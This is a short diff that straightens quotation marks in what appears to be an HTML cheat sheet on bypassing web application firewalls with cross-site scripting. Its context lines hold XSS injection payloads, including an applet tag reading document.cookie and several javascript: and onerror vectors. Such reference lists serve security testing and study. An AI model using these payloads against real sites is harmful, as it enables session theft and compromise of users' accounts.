@@ -7511,7 +7511,7 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <h2 id="methods-to-bypass-waf-cross-site-scripting">Methods to Bypass WAF – Cross-Site Scripting<a class="headerlink" href="#methods-to-bypass-waf-cross-site-scripting" title="Permanent link">&para;</a></h2>
 <h3 id="general-issues">General issues<a class="headerlink" href="#general-issues" title="Permanent link">&para;</a></h3>
 <h4 id="stored-xss">Stored XSS<a class="headerlink" href="#stored-xss" title="Permanent link">&para;</a></h4>
-<p>If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.</p>
+<p>If an attacker managed to push XSS through the filter, WAF wouldn't be able to prevent the attack conduction.</p>
 <h4 id="reflected-xss-in-javascript">Reflected XSS in JavaScript<a class="headerlink" href="#reflected-xss-in-javascript" title="Permanent link">&para;</a></h4>
 <p>Example:</p>
 <div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="err">\\</span><span class="s2">"writetitle()\\"</span><span class="p">,</span><span class="nx">$</span><span class="err">\</span><span class="nx">_GET</span><span class="err">\</span><span class="p">[</span><span class="nx">xss</span><span class="err">\</span><span class="p">])</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="o">&lt;</span><span class="err">/script&gt;</span>
@@ -7551,7 +7551,7 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <li><code>&lt;Input value = "XSS" type = text&gt;</code></li>
 <li><code>&lt;applet code="javascript:confirm(document.cookie);"&gt;</code></li>
 <li><code>&lt;isindex x="javascript:" onmouseover="alert(XSS)"&gt;</code></li>
-<li><code>"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
+<li><code>"&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li>
 <li><code>"&gt;&lt;img src="x:x" onerror="alert(XSS)"&gt;</code></li>
 <li><code>"&gt;&lt;iframe src="javascript:alert(XSS)"&gt;</code></li>
 <li><code>&lt;object data="javascript:alert(XSS)"&gt;</code></li>
